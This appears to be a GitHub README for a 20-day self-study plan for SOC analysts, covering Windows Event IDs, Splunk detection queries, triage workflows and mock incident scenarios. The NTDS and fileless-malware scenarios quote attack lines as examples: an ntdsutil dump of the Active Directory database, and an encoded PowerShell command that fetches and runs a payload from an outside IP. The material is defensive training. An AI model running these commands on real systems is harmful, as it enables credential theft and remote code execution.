# 🛡️ SOC Analyst Bootcamp — 20-Day Self-Study Plan

**Type:** Self-directed study | **Focus:** Blue Team / SOC Operations  
**Duration:** 20 Days | **Status:** 🟡 In Progress (Day 7/20) | Interview Prep Track Active

> Built as part of my preparation for SOC Analyst (L1/L2) roles alongside an active internship at the Kerala Police Cybercrime Unit.

---

## 🎯 Objective

To build job-ready SOC Analyst (L1/L2) skills through structured daily study covering
real-world tools, techniques, and scenarios used in Security Operations Centers.

---

## 📅 Progress Tracker

| Day | Topic | Status |
|-----|-------|--------|
| Day 1 | Windows Event Logs & Key Event IDs | ✅ Done |
| Day 2 | Logon Types, Persistence Mechanisms & MITRE ATT&CK Mapping | ✅ Done |
| Day 3 | Cyber Kill Chain & Attack Frameworks | ✅ Done |
| Day 4 | Network Traffic Analysis with Wireshark | ✅ Done |
| Day 5 | SIEM Basics & Splunk Fundamentals 1 | ✅ Done |
| Day 6 | Alert Triage & Escalation Workflow | ✅ Done |
| Day 7 | Mock Incident Response Scenarios (x5) + Extended Interview Prep (x2) | ✅ Done |
| Day 8 | Phishing Email Analysis | ⬜ Upcoming |
| Day 9 | Malware Behaviour Analysis (Static) | ⬜ Upcoming |
| Day 10 | Malware Behaviour Analysis (Dynamic) | ⬜ Upcoming |
| Day 11 | Threat Intelligence & IOC Hunting | ⬜ Upcoming |
| Day 12 | Endpoint Detection & Response (EDR) | ⬜ Upcoming |
| Day 13 | Memory Forensics Basics | ⬜ Upcoming |
| Day 14 | Incident Response Lifecycle | ⬜ Upcoming |
| Day 15 | SOC Playbooks & Runbooks | ⬜ Upcoming |
| Day 16 | Active Directory Attacks & Detection | ⬜ Upcoming |
| Day 17 | Cloud Security Monitoring (Azure/AWS) | ⬜ Upcoming |
| Day 18 | CTF — TryHackMe SOC Level 1 | ⬜ Upcoming |
| Day 19 | CTF — LetsDefend Practice Alerts | ⬜ Upcoming |
| Day 20 | Final Review & Mock SOC Scenario | ⬜ Upcoming |

---

## 📁 Mock Scenario Walkthroughs

Full end-to-end incident response scenarios practised during Day 7, documented with
alert details, triage steps, Event IDs, MITRE mappings, containment actions, and lessons learned.

| # | Scenario | Severity |
|---|----------|----------|
| 01 | [Brute Force RDP on Domain Controller](mock-scenarios/01-brute-force-rdp.md) | 🔴 Critical |
| 02 | [BEC Phishing — Finance Executive Compromise](mock-scenarios/02-phishing-c2.md) | 🔴 Critical |
| 03 | [Insider Threat — Departing Employee Exfiltration](mock-scenarios/03-insider-threat.md) | 🔴 Critical |
| 04 | [Ransomware — Network Propagation via Shared Drive](mock-scenarios/04-ransomware.md) | 🔴 Critical |
| 05 | [Privilege Escalation via Compromised Web Server](mock-scenarios/05-privilege-escalation.md) | 🔴 Critical |

---

## 📚 Topics Covered

### ✅ Day 1 — Windows Event Logs & Key Event IDs

- Windows Event Log structure and log types
- Key Event IDs every SOC analyst must know

| Event ID | Description |
|----------|-------------|
| 4624 | Successful logon |
| 4625 | Failed logon |
| 4648 | Logon with explicit credentials |
| 4672 | Special privileges assigned |
| 4688 | New process created |
| 4698 | Scheduled task created |
| 4720 | User account created |
| 4732 | User added to privileged group |
| 4740 | Account locked out |
| 7045 | New service installed |

---

### ✅ Day 2 — Logon Types, Persistence & MITRE ATT&CK

**Logon Types**

| Type | Name | Description | Red Flag Condition |
|------|------|-------------|-------------------|
| 2 | Interactive | Local keyboard login | Normal for workstations |
| 3 | Network | SMB, file shares, WinRM | Admin account on DC from unknown host |
| 4 | Batch | Scheduled tasks | Unexpected on sensitive servers |
| 5 | Service | Service starting under account | Unusual service account on critical system |
| 7 | Unlock | Workstation unlock | Normal |
| 10 | RemoteInteractive | RDP session | From external IP or non-admin user |
| 11 | CachedInteractive | Offline cached credentials | Normal for laptops offline |

**Persistence Mechanisms & MITRE Mappings**

| Technique | MITRE ID | Detection |
|-----------|----------|-----------|
| Scheduled Tasks | T1053.005 | Event ID 4698 |
| Registry Run Keys | T1547.001 | Registry monitoring |
| Startup Folder | T1547.001 | File system monitoring |
| New Service Creation | T1543.003 | Event ID 7045 |
| PowerShell Profile | T1546.013 | PowerShell logging |

**Parent-Child Process Red Flags**

| Process | Legitimate Parent | Suspicious Parent |
|---------|------------------|-------------------|
| svchost.exe | services.exe | explorer.exe, cmd.exe, any user process |
| powershell.exe | explorer.exe, cmd.exe | WINWORD.EXE, EXCEL.EXE, OUTLOOK.EXE |
| cmd.exe | explorer.exe | Office applications |
| lsass.exe | wininit.exe ONLY | Any other parent |

---

### ✅ Day 3 — Cyber Kill Chain & Attack Frameworks

**Cyber Kill Chain — 7 Stages**

| Stage | Description | L1 Detection Point |
|-------|-------------|-------------------|
| 1. Reconnaissance | Attacker gathers intel on the target | Threat intel feeds |
| 2. Weaponization | Crafting malware and exploit payloads | Sandbox analysis |
| 3. Delivery | Phishing emails, USB drops, watering holes | Email gateway, AV scan |
| 4. Exploitation | Triggering the vulnerability | EDR alerts, 4688 |
| 5. Installation | Malware establishes persistence | 7045, 4698, EDR |
| 6. Command & Control | Attacker maintains remote access | SIEM outbound, proxy/DNS |
| 7. Actions on Objectives | Data theft, ransomware, disruption | DLP, file access, SIEM |

> **L1 is most active at stages 3, 5, 6, and 7.**  
> When you see Stage 5 (Installation) — Stage 6 (C2) is seconds away. Contain immediately.

---

### ✅ Day 4 — Network Traffic Analysis with Wireshark

- TCP 3-way handshake and half-open connections (SYN flood detection)
- Common ports and their attack relevance

| Port | Service | Attack Risk |
|------|---------|-------------|
| 22 | SSH | Brute force |
| 25 | SMTP | Email spoofing |
| 53 | DNS | DNS exfiltration, poisoning |
| 80/443 | HTTP/HTTPS | C2 over web traffic |
| 445 | SMB | Lateral movement, ransomware spread |
| 3389 | RDP | Brute force, remote intrusion |

- Firewall vs IDS vs IPS — difference, placement, log types generated
- DNS poisoning and ARP spoofing detection patterns

---

### ✅ Day 5 — SIEM Basics & Splunk Fundamentals 1

**Core Splunk SPL Queries**

```spl
# Failed logins in last 24h — brute force detection
index=windows EventCode=4625 earliest=-24h
| stats count by src_ip, Account_Name
| where count > 5
| sort -count

# Success after failures (same source) — confirmed intrusion
index=windows (EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failures,
         count(eval(EventCode=4624)) as successes by src_ip
| where failures > 10 AND successes > 0

# Fake svchost — masquerading detection
index=windows EventCode=4688
| search Process_Name=*svchost* AND NOT
  New_Process_Name="C:\\Windows\\System32\\svchost.exe"
| table _time, host, Creator_Process_Name, New_Process_Name

# Outbound C2 connection check
index=network dest_ip=<suspicious_ip>
| stats sum(bytes_out) as total_bytes by src_ip, dest_port
| eval MB=round(total_bytes/1024/1024,2)
| table src_ip, dest_port, MB
```

**SIEM Concepts**
- Log aggregation, correlation, alerting, dashboards
- Use case tuning — reducing false positives without missing true positives
- Severity ratings are starting points — analyst judgment determines final severity

---

### ✅ Day 6 — Alert Triage & Escalation Workflow

**Escalation Brief Formula: WHO → WHAT → WHEN → WHERE → IMPACT → DONE → NEED**

Example:
> *"Source IP 185.220.101.45, known Tor exit node, brute-forced CORP-DC01 via RDP —
> 87 failures then success at 02:51 AM as Administrator, Logon Type 10. DC01 is prod
> domain controller. AbuseIPDB: 97% abuse score. Lateral movement confirmed to FS01
> via svc_backup. Both hosts isolated via EDR. Recommend forensic imaging.
> Do I have approval to engage IR team?"*

**Severity Upgrade Rules**
- Target is Domain Controller, Finance server, or Executive endpoint → upgrade immediately
- Source IP confirmed malicious on AbuseIPDB / VirusTotal → upgrade
- Successful logon follows cluster of failures → upgrade
- Departing employee + sensitive file types → upgrade
- Privileged account behaving abnormally → upgrade

**Incident Ticket Structure**
Ticket ID: INC-YYYY-XXXX
Type: [Brute Force / Intrusion / Phishing / Ransomware / Insider / Priv Esc]
Severity: Critical / High / Medium / Low
Priority: P1 / P2 / P3
Status: Detected → Triaged → Contained → Eradicated → Closed
Assigned To: [L2 Name]
Opened: HH:MM | Contained: HH:MM | Closed: HH:MM
Actions Taken (timestamped — mandatory):
02:47 — Alert triggered in SIEM. L1 triage initiated.
02:48 — Source IP checked on AbuseIPDB. 97% score, confirmed Tor exit node.
02:50 — Event ID 4624 success confirmed. Escalated to L2 [Name].
02:55 — Isolation approved. EDR isolation applied to CORP-DC01.

---

### ✅ Day 7 — Mock Incident Response Scenarios

> Five high-pressure SOC L1 scenarios practised end-to-end — triage, investigation,
> containment, escalation brief, and documentation. Scenarios covered: Brute Force RDP,
> BEC Phishing, Insider Threat, Ransomware Propagation, and Privilege Escalation via
> Compromised Web Server. Each mirrors real-world alert conditions in a 24×7 SOC environment.
>
> Full write-ups for each scenario live in [`mock-scenarios/`](mock-scenarios/) — linked
> in the table above.

---

### ✅ Day 7 Extended — Interview Drills: Credential Access & Fileless Execution

> Two additional high-pressure interview drills run after the core five scenarios.
> Focused on Event ID analytical depth, NTDS credential dumping, valid account abuse,
> and fileless malware triage.

---

#### 🔴 Extended Scenario 01 — NTDS Credential Dump on Domain Controller

**Primary Tactic: Credential Access → Exfiltration**

**Alert Chain:**
06:44 AM — Event ID 4625 × 3 failures | Account: Administrator | Source: 10.0.0.44 | Logon Type: 3
06:49 AM — Event ID 4624 success      | Account: Administrator | Source: 10.0.0.44 | Logon Type: 3
06:51 AM — Event ID 4688              | Creator: cmd.exe | New Process: ntdsutil.exe
Command: ntdsutil "ac i ntds" "ifm" "create full c:\temp\dump" q q

**Why 3 failures on DC01 is not noise:**
- Target is the built-in Administrator account on a Domain Controller
- Built-in Administrator on a DC should almost never appear via network Logon Type 3
- Internal source IP (10.0.0.44) needs investigation — legitimate admin box or compromised internal machine?
- Asset criticality overrides low failure count

**What ntdsutil "create full c:\temp\dump" is doing:**
> This is an NTDS.dit database dump — not metadata cleanup.
> NTDS.dit is the Active Directory database: every user account, every password hash,
> every Kerberos key in the entire domain. Dumped to a temp folder = staged for exfiltration.
> If successful, the attacker can crack every password offline and own the entire organisation
> without ever logging in again.
>
> MITRE T1003.003 — OS Credential Dumping: NTDS  
> Every credential in the domain must be treated as compromised.

**Event IDs to pull after 4624 success on DC01 — in priority order:**

| Event ID | Why — not just what |
|----------|---------------------|
| 4672 | Did this session receive admin-level privileges? Confirms full scope of access. |
| 4688 | What processes ran after login? CMD, PowerShell, mimikatz — this is your attack chain. |
| 4698 | Did they create a scheduled task for persistence before anything else? |
| 4634 | Session end — useful for timeline reconstruction, not your first move. |

**Scheduled Task Red Flags — 3 specific indicators:**
Task Name:  \Microsoft\Windows\UpdateHealth   ← designed to look legitimate
Action:     C:\Users\Public\svchost.exe       ← world-writable folder, never a real Windows path
Created By: NT AUTHORITY\SYSTEM at 11:23 PM  ← SYSTEM creating new tasks at night = prior compromise

> If NT AUTHORITY\SYSTEM is creating tasks, something already running as SYSTEM planted it.
> That means there is a prior compromise you haven't found yet — work backwards.

**Escalation Brief:**
> *"Confirmed credential dump on CORP-DC01. Internal host 10.0.0.44 brute-forced the
> built-in Administrator account via network logon, authenticated at 06:49, immediately
> ran ntdsutil to dump the full NTDS.dit to C:\temp\dump. That's every password hash in
> the domain. Rating this Critical. Need approval to isolate DC01 and 10.0.0.44. Recommend
> treating this as a full domain compromise — every credential needs rotation. Do I have your go-ahead?"*

**Valid Account Detection — the hardest L1 scenario:**
Event ID: 4624
Account: svc_sqlbackup
Source Host: CORP-WEB01
Target Host: CORP-DB01
Logon Type: 3
Times: Mon 01:43 | Tue 03:12 | Wed 02:58 | Thu 02:17
AV: Clean | Failed logins: None | Account: Legitimate

> ⚠️ "Everything looks clean" is not an answer. This is MITRE T1078 — Valid Accounts.
> Attackers operating with legitimate credentials inside normal infrastructure is the
> hardest attack to catch — and the most common L1 failure mode.

**Red flags in this clean-looking alert:**
- Randomised timing — legitimate scheduled tasks run at fixed times. Randomisation is a deliberate attacker technique to evade time-based detection rules
- Web server authenticating to database server — backups typically run from a dedicated backup server, not the web tier
- Pattern started this week — if svc_sqlbackup is 2 years old but this behaviour started Monday, something changed Monday

**How to prove benign vs malicious:**
| To prove benign | To prove malicious |
|----------------|-------------------|
| Check documented purpose — should it run from WEB01? | Pull 4688 on WEB01 around each logon time — what process initiated this? |
| Pull task scheduler on WEB01 — registered task? | Has svc_sqlbackup accessed anything beyond DB01 this week? |
| Verify with DBA team — do they have a matching backup job? | Check 4698 on WEB01 — was a new task created recently? |
| Check DB01 activity — legitimate backup = large read activity | Pull WEB01 compromise history — any alerts in last 2 weeks? |

---

#### 🔴 Extended Scenario 02 — Fileless Malware via Phishing (Marketing Executive)

**Primary Tactic: Initial Access → Execution → Privilege Escalation → C2**

**Alert Chain:**
14:13 — Event ID 4624  | Account: sarah.thomas | Host: CORP-SARAH-PC01 | Logon Type: 2
14:13 — Event ID 4672  | Account: sarah.thomas | Privileges: SeDebugPrivilege,
SeImpersonatePrivilege,
SeTcbPrivilege
14:11 — Event ID 4688  | Creator: OUTLOOK.EXE | New Process: powershell.exe
Command: powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBuAHYAbwBr...

**Why 4672 on a marketing executive is Critical:**
> SeDebugPrivilege, SeImpersonatePrivilege, and SeTcbPrivilege together = near-SYSTEM level access.
> A marketing executive has no legitimate reason for any of these three privileges.
> Her account is either compromised or malware running under her session performed privilege escalation.

**What -EncodedCommand actually means:**
> `-EncodedCommand` accepts a Base64-encoded string and executes it as PowerShell at runtime.
> The long string in the logs is not a hash — it is Base64-encoded PowerShell code that
> decodes and runs in memory. Attackers use it to evade signature-based detection: tools
> scanning for keywords like `Invoke-Mimikatz` or `DownloadString` see nothing in plain text.
>
> MITRE T1027 — Obfuscated Files or Information
>
> To decode in a sandbox:
> ```powershell
> [System.Text.Encoding]::Unicode.GetString(
> [System.Convert]::FromBase64String('SQBuAHYAbwBrAGUA...'))
> ```

**Decoded payload:**
```powershell
IEX (New-Object Net.WebClient).DownloadString(
    'http://185.220.101.12/stage2/payload.ps1')
```

> `IEX` = Invoke-Expression — executes whatever string is passed to it at runtime.
> This command downloads a second-stage payload and executes it entirely in memory.
> No file is written to disk. Traditional forensics finds nothing.

**Kill Chain position:**
Stage 1–4 ✓ Done (recon, weaponize, delivery, exploitation — Outlook macro)
Stage 5   → HAPPENING NOW (stage2/payload.ps1 downloading)
Stage 6   → SECONDS AWAY (payload will beacon out)
Stage 7   → NOT YET — but imminent

**Four immediate actions — 60-second window:**
1. **Block 185.220.101.12 at perimeter firewall** — one rule protects all endpoints simultaneously
2. **Isolate CORP-SARAH-PC01 via EDR** — cuts this machine while firewall covers everyone else
3. **Memory dump immediately** — IEX executes in memory only; payload.ps1 never touches disk; memory dump is the only forensic artifact
4. **Pull DNS and proxy logs** — check if any other hosts have contacted this IP; hunt for lateral spread before it becomes an outbreak

**MITRE ATT&CK:**
| Technique | ID |
|-----------|-----|
| Phishing: Spearphishing Attachment | T1566.001 |
| PowerShell | T1059.001 |
| Obfuscated Files or Information | T1027 |
| Abuse Elevation Control Mechanism | T1548 |
| C2 over HTTP | T1071.001 |

**Key Lessons:**
- SeDebugPrivilege + SeImpersonatePrivilege + SeTcbPrivilege on a non-admin = immediate Critical
- `-EncodedCommand` is Base64 obfuscation, not a hash — know the difference
- IEX = fileless execution — memory dump is your only evidence
- Block at firewall first, isolate endpoint second — order matters when you have seconds

---

## 🧰 Tools & Platforms

`Windows Event Viewer` `Wireshark` `Splunk` `Microsoft Sentinel`  
`MITRE ATT&CK Navigator` `TryHackMe` `LetsDefend` `Hack The Box`  
`AbuseIPDB` `VirusTotal` `EDR (CrowdStrike / Microsoft Defender)`

---

## 🏆 Certifications Running Alongside

| Certification | Platform | Status |
|---------------|----------|--------|
| SOC Fundamentals | LetsDefend × HackTheBox | ✅ Completed |
| CEH | EC-Council | 🟡 In Progress |
| SOC Analyst Bootcamp (Self-directed) | GitHub | 🟡 In Progress — Day 7/20 |

---

## 📌 Related Projects

- [Web Application VAPT Report](https://github.com/AleenaRoseGeorge/web-application-pentest-report)
- [Cyber Forensics Internship](https://github.com/AleenaRoseGeorge/cyber-forensics-internship)

---

*Built in public. Updated daily. Every mistake documented.*
